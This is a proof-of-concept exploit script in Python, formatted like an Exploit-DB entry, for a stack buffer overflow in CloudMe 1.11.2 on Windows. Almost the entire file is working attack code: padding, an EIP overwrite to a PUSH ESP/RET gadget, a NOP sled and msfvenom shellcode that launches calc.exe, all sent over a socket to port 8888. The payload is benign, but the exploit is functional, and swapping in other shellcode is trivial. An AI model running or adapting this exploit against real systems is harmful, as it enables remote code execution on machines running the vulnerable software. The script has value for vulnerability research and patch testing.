# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python





buf =  b""
buf += b"\xdb\xd1\xbd\x7c\xac\x15\x7b\xd9\x74\x24\xf4\x58\x31"
buf += b"\xc9\xb1\x3e\x31\x68\x19\x83\xc0\x04\x03\x68\x15\x9e"
buf += b"\x59\xe9\x93\xdc\xa2\x12\x64\x80\x2b\xf7\x55\x80\x48"
buf += b"\x73\xc5\x30\x1a\xd1\xea\xbb\x4e\xc2\x79\xc9\x46\xe5"
buf += b"\xca\x67\xb1\xc8\xcb\xdb\x81\x4b\x48\x21\xd6\xab\x71"
buf += b"\xea\x2b\xad\xb6\x16\xc1\xff\x6f\x5d\x74\x10\x1b\x2b"
buf += b"\x45\x9b\x57\xba\xcd\x78\x2f\xbd\xfc\x2e\x3b\xe4\xde"
buf += b"\xd1\xe8\x9d\x56\xca\xed\x9b\x21\x61\xc5\x50\xb0\xa3"
buf += b"\x17\x99\x1f\x8a\x97\x68\x61\xca\x10\x92\x14\x22\x63"
buf += b"\x2f\x2f\xf1\x19\xeb\xba\xe2\xba\x78\x1c\xcf\x3b\xad"
buf += b"\xfb\x84\x30\x1a\x8f\xc3\x54\x9d\x5c\x78\x60\x16\x63"
buf += b"\xaf\xe0\x6c\x40\x6b\xa8\x37\xe9\x2a\x14\x96\x16\x2c"
buf += b"\xf7\x47\xb3\x26\x1a\x9c\xce\x64\x71\x63\x5c\x13\x37"
buf += b"\x63\x5e\x1c\x68\x0b\x6f\x97\xe7\x4c\x70\x72\x4c\xa2"
buf += b"\x3a\xdf\xe5\x2a\xe3\xb5\xb7\x37\x14\x60\xfb\x41\x97"
buf += b"\x81\x84\xb6\x87\xe3\x81\xf3\x0f\x1f\xf8\x6c\xfa\x1f"
buf += b"\xaf\x8d\x2f\x5c\x75\x2d\xa8\x02\xe4\xbd\x38\x99\x9e"
buf += b"\x49\xdd\x4e\x3c\xc2\x41\xf6\xbb\x49\x26\x8d\x4b\xfd"
buf += b"\xb9\x0c\xc8\xa1\x2b\xac\x3e\x3c\xcc\x57\x1f\x93\x49"
buf += b"\xb8\x3c\x86\xf5\x96\xa7\x20\x93\xc6\x16\xe0\x75\x36"
buf += b"\x69\x2e\xbb\x0c\xa7\x19\x8e\x4c\x83\x51\xc4\xb9\xeb"


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + buf))	

buf = padding1 + EIP + NOPS + buf + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
